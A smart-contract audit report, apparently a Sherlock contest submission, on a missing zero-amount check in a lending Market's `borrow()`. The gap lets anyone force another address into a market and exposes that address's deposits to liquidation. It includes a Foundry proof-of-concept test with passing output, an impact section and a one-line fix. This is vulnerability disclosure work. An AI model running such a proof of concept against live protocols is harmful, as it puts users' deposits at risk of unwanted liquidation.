Faithful Felt Swift

medium

# borrow() maliciously let others to enter market

## Summary
After `borrow()` is executed successfully, `borrower` will automatically enter the market.
This method performs a security check to determine if the `msg.sender` allowance is sufficient to avoid malicious operations.
But it doesn't limit the borrow number !=0, so anyone can execute without an allowance.
This causes the permission check to fail and maliciously allows others to enter the market

## Vulnerability Detail
`borrow()` is executed by calling `auditor.checkBorrow()`.
`checkBorrow()` will cause the `borrower` to automatically enter the market.
```solidity
contract Market is Initializable, AccessControlUpgradeable, PausableUpgradeable, ERC4626 {
..
  function borrow(
    uint256 assets,
    address receiver,
    address borrower
  ) external whenNotPaused whenNotFrozen returns (uint256 borrowShares) {
@> //@audit missing check assets !=0
    spendAllowance(borrower, assets);

...

@>  auditor.checkBorrow(this, borrower);
    asset.safeTransfer(receiver, assets);
  }

```
```solidity
contract Auditor is Initializable, AccessControlUpgradeable {
...
  function checkBorrow(Market market, address borrower) external {
    MarketData storage m = markets[market];
    if (!m.isListed) revert MarketNotListed();

    uint256 marketMap = accountMarkets[borrower];
    uint256 marketMask = 1 << m.index;

    // validate borrow state
    if ((marketMap & marketMask) == 0) {
      // only markets may call checkBorrow if borrower not in market
      if (msg.sender != address(market)) revert NotMarket();

@>    accountMarkets[borrower] = marketMap | marketMask;
      emit MarketEntered(market, borrower);
    }
```

however,  this method does not determine that `assets` cannot be 0. If the user specifies `assets=0` then the security check for allowances can be skipped, and the `borrower` will enter the market after the method is executed successfully

### POC

The following code demonstrates that no allowances are needed to let the `borrower` enter the market

add to `Market.t.sol`
```solidity
  function testAnyoneEnterMarket() external {
    (,, uint8 index,,) = auditor.markets(
      Market(address(market))
    );
    bool inMarket = auditor.accountMarkets(BOB) & (1 << index) == 1;
    console2.log("bob in market(before):",inMarket);
    console2.log("anyone execute borrow(0)");
    vm.prank(address(0x1230000123)); //anyone
    market.borrow(0, address(this), BOB);
    inMarket = auditor.accountMarkets(BOB) & (1 << index) == 1;
    console2.log("bob in market(after):",inMarket);
  }  
```

```console
$ forge test -vvv --match-test testAnyoneEnterMarket

Ran 1 test for test/Market.t.sol:MarketTest
[PASS] testAnyoneEnterMarket() (gas: 172080)
Logs:
  bob in market(before): false
  anyone execute borrow(0)
  bob in market(after): true

```

## Impact

The current protocol makes a strict distinction between enter market or not.
A user can be a simple `LP` to a market and not participate in borrowing or collateralization, which is then protected and cannot be used as a `seize market` for liquidation purposes.
At the same time, if the user does not enter the market, then the user can access the assets as they wish without constraints.
And so on.
If any person can maliciously allow others to enter the market to break the rules. 
For example, maliciously liquidating `seize` a protected market

## Code Snippet
https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L167
## Tool used

Manual Review

## Recommendation

```diff
  function borrow(
    uint256 assets,
    address receiver,
    address borrower
  ) external whenNotPaused whenNotFrozen returns (uint256 borrowShares) {
+   if (assets == 0) revert ZeroBorrow();
    spendAllowance(borrower, assets);
```
